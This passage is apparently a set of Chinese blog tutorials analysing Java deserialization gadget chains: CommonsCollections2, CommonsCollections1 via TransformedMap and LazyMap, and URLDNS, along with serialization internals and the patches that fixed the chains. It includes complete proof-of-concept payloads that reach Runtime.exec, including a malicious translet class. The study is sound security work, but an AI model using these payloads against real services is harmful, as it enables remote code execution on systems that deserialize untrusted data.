Field bytecodes = TemplatesImpl.class.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]{bytes}); // _name 不能为空 Field name = TemplatesImpl.class.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(tmpl, \u0026#34;reus09\u0026#34;); Field field = PriorityQueue.class.getDeclaredField(\u0026#34;queue\u0026#34;); field.setAccessible(true); Object[] objects = (Object[]) field.get(queue); objects[0] = tmpl; // 用 InvokerTransformer 来反射调用 TemplatesImpl 的 newTransformer 方法 // 这个类是 public 的，方便调用 Transformer transformer = new InvokerTransformer(\u0026#34;newTransformer\u0026#34;, new Class[]{}, new Object[]{}); TransformingComparator comparator = new TransformingComparator(transformer); Field field2 = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;comparator\u0026#34;); field2.setAccessible(true); field2.set(queue, comparator); SerializeUtil.writeObjectToFile(queue, fileName); SerializeUtil.readFileObject(fileName); } } 编写一个恶意的Calc类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package CC2; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; /** * @ClassName Calc * @Description TODO * @Author reus09 * @Date 2022/10/21 19:43 * @Version 1.0 **/ public class Calc extends AbstractTranslet { static { String command = \u0026#34;open -a Calculator.app\u0026#34;; String osName = System.getProperty(\u0026#34;os.name\u0026#34;); if (osName.startsWith(\u0026#34;Windows\u0026#34;)) { command = \u0026#34;calc 12345678901234567\u0026#34;; } else if (osName.startsWith(\u0026#34;Linux\u0026#34;)) { command = \u0026#34;curl localhost:9999/\u0026#34;; } try { Runtime.getRuntime().exec(command); } catch (IOException e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } ysoserial 的 CC2 运行效果：\n总结 利用说明：\n利用 PriorityQueue 在反序列化后会对队列进行优先级排序的特点，为其指定 TransformingComparator 排序方法，并在其中为其添加 Transforer，与 CC1 类似，主要的触发位置还是 InvokerTransformer。 Gadget 总结：\nkick-off gadget：java.util.PriorityQueue#readObject() sink gadget：com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer() chain gadget：org.apache.commons.collections4.comparators.TransformingComparator#compare() 调用链展示\nysoserial的CC2链 1 2 3 4 5 PriorityQueue.readObject() TransformingComparator.compare() *ChainedTransformer.transform() InvokerTransformer.transform() TemplatesImpl.newTransformer() PriorityQueue的利⽤链不⽀持在commons-collections 3中使⽤。 因为类 org.apache.commons.collections4.comparators.TransformingComparator 在commonscollections4.0以前是版本中是没有实现 Serializable 接⼝的，⽆法在序列化中使⽤。\n修复3.2.2 新版代码中增加了⼀个⽅法FunctorUtils#checkUnsafeSerialization ，⽤于检测反序列化是否安全。如果开发者没有设置全局配置 org.apache.commons.collections.enableUnsafeSerialization=true ，即默认情况下会抛出异常。 这个检查在常⻅的危险Transformer类（ InstantiateTransformer 、 InvokerTransformer 、 PrototypeFactory 、 CloneTransformer 等）的 readObject ⾥进⾏调⽤，所以，当我们反序列化包含这些对象时就会抛出⼀个异常：\n1 2 3 4 Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property \u0026#39;org.apache.commons.collections.enableUnsafeSerialization\u0026#39; to \u0026#39;true\u0026#39;, but you must ensure that your application does not de-serialize objects from untrusted sources. 4.1⾥，这⼏个危险Transformer类不再实现 Serializable 接⼝，也就是说，他们⼏个彻底⽆法序列化和反序列化了。\n依赖版本\ncommons-collections4 : 4.0\n","permalink":"http://www.reus09.top/posts/tech/commonscollections2%E5%88%86%E6%9E%90/","summary":"学习完CommonCollections1链之后，很自然的学习了CommonCollection2，但是CC2链的依赖版本较为固定，为com","title":"CommonsCollections2分析"},{"content":"Apache Commons Collections 是一个扩展了 Java 标准库里的 Collection 结构的第三方基础库，它提供了很多强有力的数据结构类型并实现了各种集合工具类。作为 Apache 开源项目的重要组件，被广泛运用于各种 Java 应用的开发。\n从本文开始正式对CommonsCollections反序列化链进行学习，第一篇文章主要分析一下CommonsCollections1这条链，通过对CommonsCollections1链的学习，学到了TransformedMap和LazyMap的一些用法，包括Transformer的一些实现类，最后还有CommonsCollections1链的构造原理。\n前置知识 跟随su18师傅的博客，我们首先对CommonsCollections1链中要用到的一些基础知识进行学习。\nAbstractMapDecorator CC库提供了一个抽象类org.apache.commons.collections.map.AbstractMapDecorator,这个类是Map的扩展类，并且从Decorator可以看出，这是一个基础的装饰器，用来给map提供附加功能，被装饰的map存在该类的属性中，并且将所有的操作都转发给这个map。\n这里我们主要学习一下它的两个实现类，TransformedMap和LazyMap。\nTransformedMap org.apache.commons.collections.map.TransformedMap#decorate方法描述 了一个元素在被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由传入的keyTransformer和valueTransformer进行定义，这两个参数在TransformedMap实例化的时候作为参数传入。\n测试用例如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 import com.sun.org.apache.xalan.internal.xsltc.cmdline.Transform; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; /** * @ClassName TransformedMapTest * @Description TODO * @Author reus09 * @Date 2022/10/24 21:00 * @Version 1.0 **/ public class TransformedMapTest { public static HashMap\u0026lt;Integer, String\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); /* * 创建自定义key , 实现key + 1 */ public static Transformer keyTransformer = input -\u0026gt;{ int num = (int) input; num += 1 ; return (Object)num; }; // 创建自定义`value` ， 实现`value`字符串后面拼接\u0026#34;1\u0026#34; public static Transformer valueTransformer = output -\u0026gt;{ String string = output.toString(); return string + \u0026#34;1\u0026#34;; }; public static void main(String[] args) { hashMap.put(1,\u0026#34;a\u0026#34;); System.out.println(\u0026#34;初始化map：\u0026#34; + hashMap); Map map = TransformedMap.decorate(hashMap,keyTransformer,valueTransformer); map.put(2,\u0026#34;b\u0026#34;); System.out.println(\u0026#34;transformedMap: \u0026#34; + hashMap); map.put(1,\u0026#34;w\u0026#34;); System.out.println(\u0026#34;transformedMap: \u0026#34; + hashMap); map.remove(1); System.out.println(\u0026#34;transformedMap: \u0026#34; + hashMap); } } 运行效果图:\n也就是说起到的效果是:当 TransformedMap 内的 key 或者 value 发生变化时（例如调用 TransformedMap 的 put 方法时），就会触发相应参数的 Transformer 的 transform() 方法。\nLazyMap org.apache.commons.collections.map.LazyMap 与 TransformedMap 类似，不过差异是调用 get() 方法时如果传入的 key 不存在，则会触发相应参数的 Transformer 的 transform() 方法。\nLazyMap在初始化的时候，需要另外传入一个Factory或者Transformer来定义操作。\n查看LazyMap的get方法，在处理过程中，将key经过fatcory.transform()方法处理后的结果作为value。\n示例代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; /** * @ClassName LazyMapTest * @Description TODO * @Author reus09 * @Date 2022/10/25 15:27 * @Version 1.0 **/ public class LazyMapTest { public static HashMap\u0026lt;Integer, String\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); // key 对应的 value 赋值为 key+1 public static Transformer factory = input -\u0026gt;{ int num = (int) input; num += 1 ; return (Object)num; }; public static void main(String[] args) { hashMap.put(1,\u0026#34;hello\u0026#34;); System.out.println(hashMap); Map lazyMap = LazyMap.decorate(hashMap,factory); lazyMap.get(2); System.out.println(hashMap); lazyMap.get(5); System.out.println(hashMap); } } 运行结果：\n与 LazyMap 具有相同功能的，是 org.apache.commons.collections.map.DefaultedMap，同样是 get() 方法会触发 transform 方法。\nTransformer 在上面的AbstractMapDecorator的相关子类的实例化过程中，我们发现都需要传入Transformer进行处理，那么我们就进一步看一下Transformer。\norg.apache.commons.collections.Transformer 是一个接口，提供了一个 transform() 方法，用来定义具体的转换逻辑。方法接收 Object 类型的 input，处理后将 Object 返回。\n在 Commons Collection 3.1 中，程序提供了 14 个 Transformer 的实现类，用来实现不同的对 TransformedMap 中 key/value 进行修改的功能。\n我们重点关注几个实现类。\nInvokeTransformer 这个实现类从 Commons Collections 3.0 引入，功能是使用反射创建一个新对象，我们来看一下它的 transfrom 方法，方法注释写的很清楚，通过调用 input 的方法，并将方法返回结果作为处理结果进行返回。\n调用的参数iMethodName/iParamTypes是在 InvokerTransformer 的构造函数中传入。这样我们就可以使用 InvokerTransformer 来执行方法\n测试代码:\n1 2 3 // InvokerTransformer 弹计算器测试 Transformer transformer = new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a Calculator.app\u0026#34;}); transformer.transform(Runtime.getRuntime()); 这个代码的逻辑就是将传入的Runtime.getRuntime()反射调用它内部的方法exec,其中exec方法是根据传入的methodName,iParamType确定的，并且exec执行的iArgs也是初始化过程中给予的。\nChainedTransformer org.apache.commons.collections.functors.ChainedTransformer 类也是一个 Transformer的实现类，但是这个类自己维护了一个 Transformer 数组， 在调用 ChainedTransformer 的 transform 方法时，会循环数组，依次调用 Transformer 数组中每个 Transformer 的 transform 方法，并将结果传递给下一个 Transformer\n这段代码逻辑通俗来说，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊\n这样就给了使用者链式调用多个 Transformer分别处理对象的能力。\nConstantTransformer org.apache.commons.collections.functors.ConstantTransformer 是一个返回固定常量的 Transformer，在初始化时储存了一个 Object，后续的调用时会直接返回这个 Object。\n这个类用于和 ChainedTransformer 配合，将其结果传入 InvokerTransformer 来调用我们指定的类的指定方法。\n测试结果如下：\n攻击构造 有了上述基础知识的铺垫，就可以开始构造反序列化的恶意利用代码了。\n由于环境问题的考虑\n例如我们还是要执行 Runtime.getRuntime().exec(\u0026quot;open -a Calculator.app\u0026quot;)，按照需求对其进行拆分，这里使用 TransformedMap 触发。\n实例代码如下：\n1 2 3 4 5 6 7 8 9 10 11 // 结合 ChainedTransformer ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a Calculator.app\u0026#34;}) }); Map map2 = TransformedMap.decorate(hashMap, chain, null); map2.put(10, \u0026#34;aaa\u0026#34;); 使用 ConstantTransformer 返回 Runtime 的 Class 对象，传入 InvokerTransformer 中，并借助 ChainedTransformer 的链式调用方式完成反射的调用，支持恶意代码。\n那么我们为什么不直接构造new ConstantTransformer(Runtime.getRuntime()),然后直接exec呢？ 原因是，Java中不是所有对象都支持序列化，待序列化的对象和所有它使用的内部属性对象，必须都实现了 java.io.Serializable 接口。而我们最早传给ConstantTransformer的是 Runtime.getRuntime() ，Runtime类是没有实现 java.io.Serializable 接口的，所以不允许被序列化。\n在上述案例中，使用 TransformedMap 的 decorate 方法将 ChainedTransformer 设置为 map 的装饰器处理方法后，当调用 TransformedMap 的 put/setValue 等方法时会触发 Transformer 链的调用处理。\n上面一连串的ChainTransformer转换成Java执行逻辑，如下所示\n1 2 Runtime Runtime = (java.lang.Runtime) Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;).invoke(null); Runtime.exec(\u0026#34;open -a Calculator.app\u0026#34;); 截止到这里，我们通过CC库成功构造了sink gadget : InvokeTransformer和chain gadget:ChainedTransformer 和 ConstantTransformer。所以我们需要找到一个kick-off gadget：一个类重写了readObject，在反序列化过程中改变了map的值。\n于是有了sun.reflect.annotation.AnnotationInvocationHandler 这个类。这个类实现了 InvocationHandler 接口，原本是用于 JDK 对于注解形式的动态代理。\n我们就来分析一下这个类具体可被利用的点。\n首先看一下构造方法:\n构造方法接受两个参数，第一个参数是Annotation实现类的Class对象，第二个参数是一个key为string,value为Object的Map。构造方法中判断type有且只有一个父接口，并且是java.lang.annotation.Annotaion.class,才会初始化两个参数。\n这里传入的memerValues就是我们可以用来触发的Map，然后，我们就看一下这个类重写的readObject方法。\n因为windows下面配置java多版本较为方便，就直接使用windows下的版本\n首先调用 AnnotationType.getInstance(this.type) 方法来获取 type 这个注解类对应的 AnnotationType 的对象，然后获取其memberTypes属性，这个属性是个 Map，存放这个注解中可以配置的值。\n然后循环 this.memberValues 这个 Map ，获取其 Key，如果注解类的 memberTypes 属性中存在与 this.memberValues 的 key 相同的属性，并且取得的值不是 ExceptionProxy 的实例也不是 memberValues 中值的实例，则取得其值，并调用setValue方法写入值。\n其实就是，注解本质是一个继承了Annotation的特殊接口，具体实现是Java运行产生的动态代理类，通过代理对象调用自定义注解(接口)的方法，最终会调用AnnotationInvocationHandler的invoke方法，该方法会从memerValues这个Map中索引出对应的值。\n重写readObject方法，就给了程序传递注解值的能力。\nTransformedMap构造 构造payload的思路：\n构造一个AnnotationInvocationHandler实例，初始化时传入一个注解类和一个 Map，这个 Map 的 key 中要有注解类中存在的属性，但是值不是对应的实例，也不是 ExceptionProxy 对象。 这个 Map 由 TransformedMap 封装，并调用自定义的 ChainedTransformer 进行装饰。 ChainedTransformer 中写入多个 Transformer 实现类，用于链式调用，完成恶意操作。 最终的恶意代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public class CC1WithTransFormedMap { public static String fileName = \u0026#34;CC1withTransformedMap.bin\u0026#34;; public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException { Map hashMap = new HashMap(); // 这里 key 一定是 下面实例化 AnnotationInvocationHandler 时传入的注解类中存在的属性值 // 并且这里的值的一定不是属性值的类型 hashMap.put(\u0026#34;comments\u0026#34;, 2); // 结合 ChainedTransformer ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }); Map transformedMap = TransformedMap.decorate(hashMap, null, chain); Class\u0026lt;?\u0026gt; c = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor = c.getDeclaredConstructors()[0]; constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Generated.class, transformedMap); SerializeUtil.writeObjectToFile(handler, fileName); SeralizeUtil.readFileObject(fileName); } } 我们查看Generated.class,发现其存在一个comments属性。\n在网上大多数payload都使用Target.class的value来触发,其实用什么触发都可以，只要是一个有属性的注解即可。\n上述恶意payload执行效果：\nLazyMap构造 之前提到过，LazyMap 通过 get() 方法获取不到 key 的时候触发 Transformer。\n我们发现 AnnotationInvocationHandler 的invoke()方法可以触发 memberValues 的 get 方法。\n这里用到的动态代理，结合我们之前学到的，被动态代理的对象调用任意方法都会调用对应InvocationHandler的invoke方法。\n那么构造思路为：在使用带有装饰器的LazyMap初始化AnnotationInvocationHandler 之前，先使用InvocationHandler代理一下LazyMap,这样反序列化AnnotationInvocationHandler 时，调用 LazyMap 值的 setValue 方法之前会调用代理类的invoke方法，触发LazyMap 的 get 方法。\n代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 public class CC1WithLazyMap { public static String fileName = \u0026#34;CC1withLazyMap.bin\u0026#34;; public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException { // 结合 ChainedTransformer ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }); Map lazyMap = LazyMap.decorate(new HashMap(), chain); Class\u0026lt;?\u0026gt; c = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor = c.getDeclaredConstructors()[0]; constructor.setAccessible(true); // 创建携带着 LazyMap 的 AnnotationInvocationHandler 实例 InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap); // 创建LazyMap的动态代理类实例 Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler); // 使用动态代理初始化 AnnotationInvocationHandler InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, mapProxy); SerializeUtil.writeObjectToFile(invocationHandler, fileName); SerializeUtil.readFileObject(fileName); } } 这个地方可以这样理解，最外面的一层invocationHandler其实就作为一个kick-off，反序列化执行readObject方法，然后在readObject方法中对我们传入的mapProxy进行操作。因为我们的mapProxy是我们LazyMap装饰过的动态代理的一个实例，因此mapProxy的任何操作都会使用handler里面的invoke方法，在invoke方法触发了this.memberValues.get(var4),然后触发LazyMap的get操作，从而触发攻击链。\n总结 以上就是 CC1 链分析的全部内容了，最后总结一下。\n利用说明：\n利用 AnnotationInvocationHandler 在反序列化时会触发 Map 的 get/set 等操作，配合 TransformedMap/LazyMap 在执行 Map 对象的操作时会根据不同情况调用 Transformer 的转换方法，最后结合了 ChainedTransformer 的链式调用、InvokerTransformer 的反射执行完成了恶意调用链的构成。其中 LazyMap 的触发还用到了动态代理机制。 Gadget 总结：\nkick-off gadget：sun.reflect.annotation.AnnotationInvocationHandler#readObject() sink gadget：org.apache.commons.collections.functors.InvokerTransformer#transform() chain gadget：org.apache.commons.collections.functors.ChainedTransformer#transform() 调用链展示：\nTransformedMap调用链\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() MapEntry.setValue() TransformedMap.checkSetValue() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() LazyMap调用链\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 依赖版本\ncommons-collections : 3.1 TransformedMap - jdk \u0026lt; 8u71\n同时，这里也提及一下为什么cc1链的TransformedMap的jdk版本要求小于8u71,在8u71以后大概是2015年12月的时候，Java 官方修改了 sun.reflect.annotation.AnnotationInvocationHandler 的readObject函数：\n改动后，不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。\n所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再执行set或put操作，也就不会触发RCE了。\n","permalink":"http://www.reus09.top/posts/tech/commonscollections1%E5%88%86%E6%9E%90/","summary":"Apache Commons Collections 是一个扩展了 Java 标准库里的 Collection 结构的第三方基础库，它提供了很多强有力的数据结构类型并实现了各种集合工具类。作为 Apache 开源项目的重要组件，被广泛","title":"CommonsCollections1分析"},{"content":"跟着su18师傅和p神继续学习Java安全，在之前对FastJson的分析中，FastJson的序列化漏洞主要是对对象反序列化过程中getter,setter方法的利用，这里学习的反序列化主要是继承了Serializable接口，重写了readObject方法的反序列化的利用。\n序列化和反序列化 Java 中的序列化与反序列化，就是将一个 Java 对象当前状态以字符串（字节序列）的形式描述出来，这串字符可能被储存/发送到任何需要的位置，在适当的时候，再将它转回原本的 Java 对象。\n这中间需要一个规则，规则中描述了序列化和反序列化时究竟该如何把一个对象处理成字符串，又如何把字符串变回对象，因为这一过程必须是可逆的。\nJava 提供了两个类 java.io.ObjectOutputStream 和 java.io.ObjectInputStream 来实现序列化和反序列化的功能，其中 ObjectInputStream 用于恢复那些已经被序列化的对象，ObjectOutputStream 将 Java 对象的原始数据类型和图形写入 OutputStream。\n在 Java 的类中，必须要实现 java.io.Serializable 或 java.io.Externalizable 接口才可以使用，而实际上 Externalizable 也是实现了 Serializable 接口。\nObjectOutputStream ObjectOutputStream 继承的父类或实现的接口如下：\n父类 OutputStream：所有字节输出流的顶级父类，用来接收输出的字节并发送到某些接收器（sink）。 接口 ObjectOutput：ObjectOutput 扩展了 DataOutput 接口，DataOutput 接口提供了将数据从任何 Java 基本类型转换为字节序列并写入二进制流的功能，ObjectOutput 在 DataOutput 接口基础上提供了 writeObject 方法，也就是类（Object）的写入。 接口 ObjectStreamConstants：定义了一些在对象序列化时写入的常量。常见的一些的比如 STREAM_MAGIC、STREAM_VERSION 等。 通过这个类的父类及父接口，我们大概可以理解这个类提供的功能：能将 Java 中的类、数组、基本数据类型等对象转换为可输出的字节，也就是反序列化。接下来看一下这个类中几个关键方法。\nwriteObject 这是 ObjectOutputStream 对象的核心方法之一，用来将一个对象写入输出流中，任何对象，包括字符串和数组，都是用 writeObject 写入到流中的。\n之前说过，序列化的过程，就是将一个对象当前的状态描述为字节序列的过程，也就是 Object -\u0026gt; OutputStream 的过程，这个过程由 writeObject 实现。writeObject 方法负责为指定的类编写其对象的状态，以便在后面可以使用与之对应 readObject 方法来恢复它。\nwriteUnshared 用于将非共享对象写入 ObjectOutputStream，并将给定的对象作为刷新对象写入流中。\n使用 writeUnshared 方法会使用 BlockDataOutputStream 的新实例进行序列化操作，不会使用原来 OutputStream 的引用对象。\nwriteObject0 writeObject 和 writeUnshared 实际上调用 writeObject0 方法，也就是说 writeObject0是上面两个方法的基础实现。具体的实现流程将会在后面再进行详细研究。\nwriteObjectOverride 如果 ObjectOutputStream 中的 enableOverride 属性为 true，writeObject 方法将会调用 writeObjectOverride，这个方法是由 ObjectOutputStream 的子类实现的。\n在由完全重新实现 ObjectOutputStream 的子类完成序列化功能时，将会调用实现类的 writeObjectOverride 方法进行处理。\nObjectInputStream ObjectInputStream 继承的父类或实现的接口如下：\n父类 InputStream：所有字节输入流的顶级父类。 接口 ObjectInput：ObjectInput 扩展了 DataInput 接口，DataInput 接口提供了从二进制流读取字节并将其重新转换为 Java 基础类型的功能，ObjectInput 额外提供了 readObject 方法用来读取类。 接口 ObjectStreamConstants：同上。 ObjectInputStream 实现了反序列化功能，看一下其中的关键方法。\nreadObject 从 ObjectInputStream 读取一个对象，将会读取对象的类、类的签名、类的非 transient 和非 static 字段的值，以及其所有父类类型。\n我们可以使用 writeObject 和 readObject 方法为一个类重写默认的反序列化执行方，所以其中 readObject 方法会 “传递性” 的执行，也就是说，在反序列化过程中，会调用反序列化类的 readObject 方法，以完整的重新生成这个类的对象。\nreadUnshared 从 ObjectInputStream 读取一个非共享对象。 此方法与 readObject 类似，不同点在于readUnshared 不允许后续的 readObject 和 readUnshared 调用引用这次调用反序列化得到的对象。\nreadObject0 readObject 和 readUnshared 实际上调用 readObject0 方法，readObject0是上面两个方法的基础实现。\nreadObjectOverride 由 ObjectInputStream 子类调用，与 writeObjectOverride 一致。\n通过上面对 ObjectOutputStream 和 ObjectInputStream 的了解，两个类的实现几乎是一种对称的、双生的方式进行。\n反序列化漏洞 在前面提到过，一个类想要实现序列化和反序列化，必须要实现 java.io.Serializable 或 java.io.Externalizable 接口。\nSerializable 接口是一个标记接口，标记了这个类可以被序列化和反序列化，而 Externalizable 接口在 Serializable 接口基础上，又提供了 writeExternal 和 readExternal 方法，用来序列化和反序列化一些外部元素。\n其中，如果被序列化的类重写了 writeObject 和 readObject 方法，Java 将会委托使用这两个方法来进行序列化和反序列化的操作。\n正是因为这个特性，导致反序列化漏洞的出现：在反序列化一个类时，如果其重写了 readObject 方法，程序将会调用它，如果这个方法中存在一些恶意的调用，则会对应用程序造成危害。\n这里，我们以一个demo程序为例子，编写了Person类，继承了Serializable接口，并且在readObject方法中重写了恶意代码，使其能够弹出计算器框。\n然后我们将这个类序列化并写在文件中，随后对其进行反序列化，就触发了命令执行。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 package Basic; import java.io.*; /** * @ClassName Person * @Description TODO * @Author reus09 * @Date 2022/10/23 15:15 * @Version 1.0 **/ public class Person implements Serializable { private String name; private int age; public Person(String name, int age) throws IOException { this.name = name; this.age = age; } private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException { Runtime.getRuntime().exec(\u0026#34;open -a Calculator.app\u0026#34;); } public static void main(String[] args) throws IOException, ClassNotFoundException { Person person = new Person(\u0026#34;reus09\u0026#34;, 21); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;abc.txt\u0026#34;)); oos.writeObject(person); oos.close(); FileInputStream fis = new FileInputStream(\u0026#34;abc.txt\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } } readObject的具体流程 为什么readObject会触发反序列化呢，我们具体走一下流程，看一下具体每个步骤的代码。\n首先，在readObject方法中调用了readObject0方法反序列化字符串。\n然后readObject0是以字节的方式去读数据，如果读取到0x73，则代表这是一个对象的序列化数据，将会调用 readOrdinaryObject 方法进行处理\n然后在readOrdinaryObject方法中，先调用readClassDesc读取类描述符，并根据其中的内容进行一些条件判断，比如是否是String,Class,ObjectStreamClass的类，然后判断其继承的是否是Externalizable接口，如果是就执行readExternalData方法，否则就执行readSerialData方法。\n在readSerialData方法中，通过类描述符的getClassDataLayout方法获得了序列化对象的数据布局，通过布局的 hasReadObjectMethod 方法判断对象是否有重写 readObject 方法，如果有，则使用 invokeReadObject 方法调用对象中的 readObject 。\n最后在invokeReadObject方法中经过一系列初始化的调用，最后执行我们反序列化后的对象的readObject方法。\n通过上述分析，我们就了解了反序列化漏洞的触发原因。与反序列漏洞的触发方式相同，在序列化时，如果一个类重写了 writeObject 方法，并且其中产生恶意调用，则将会导致漏洞，当然在实际环境中，序列化的数据来自不可信源的情况比较少见。\nURLDNS 根据su18师傅所描述，一个能成功执行的反序列化调用链需要三个元素：“kick-off”、“sink”、“chain”。翻译成中文来说就是 “入口点（重写了 readObject 的类）”、“sink 点（最终执行恶意动作的点：RCE）”、“chain （中间的调用链）”。\nURLDNS 是适合新手分析的反序列化链，只依赖原生类，没有 jdk 版本限制，也被 ysoserial 涵盖在其中。它不会执行命令，只会触发 DNS 解析，因此通常用来探测是否存在反序列化漏洞。\n这个漏洞关键点是 Java 内置的 java.net.URL 类，这个类的 equals 和 hashCode 方法具有一个有趣的特性：在对 URL 对象进行比较时（使用 equals 方法或 hashCode 方法），会触发一次 DNS 解析，因为对于 URL 来说，如果两个主机名（host）都可以解析为相同的 IP 地址，则这两个主机会被认为是相同的。\n下面我们着重分析一下equals方法和hashCode方法，学习一下为什么它能够触发DNS解析。\nURL.equals 首先在URL#equals方法重写了对Object的判断，如果obj不是URL类，直接返回false，然后调用java.net.URLStreamHandler#equals进行判断。\nURLStreamHandler#equals 方法判断 URL 对象的锚点是否相同，并调用 sameFile 方法比较两个 URL，看它们是否引用了相同的 protocol(协议)、host(主机)、port(端口)、path(路径)。\nsameFile同时还调用了hostsEquals来查看其host主机是否相同。\n在hostEqual方法中，调用了getHostAddress方法来获取主机的地址。\n在getHostAddress方法中通过getByName相当于将传入的host进行dns解析，获取IP,从而实现了触发DNS解析\nURL.hashcode 此方法将一个对象映射为一个整型的值，通常与 equals 方法同时出现。\n当 equals 方法被重写时，hashCode 也需要被重写。按照一般 hashCode 方法的实现来说，如果两个对象通过 equals 方法判断相同，那它们的 hash code 一定相等。\nURL 的 hashCode 方法也进行了重写，调用了 URLStreamHandler#hashCode 方法。在此之前有一个判断，那就是 hashCode != -1，\n同样在URLStreamHandler#hashCode方法中，调用了getHostAddress方法来实现DNS解析。\nKick-off:HashMap 上面关于URL触发DNS解析的equal,hashcode方法实际上就是这条反序列化链的sink,那么我们怎么建立一个kick-off来作为这条链的入口，就牵扯到主角java.util.HashMap,同样继承了Serializable接口。\n那么我们就看一下HashMap是如何在readObject方法中存在我们的kick-off点.\n省略掉前面各种初始化的代码，将序列化对象中的键值进行 for 循环，并调用里面的 key 和 value 对象的 readObject 方法反序列化 key 和 value 的值后，使用 putVal (1.7 是 putForCreate 方法) 将这些键、值以及相关的 hash 等信息写入 HashMap 的属性 table 中。\nHashMap 通过一个静态方法 hash 计算 key 对象的 hash 值，如果 key 为 null， 则值为 0 ，否则将调用 key 的 hashCode 方法计算 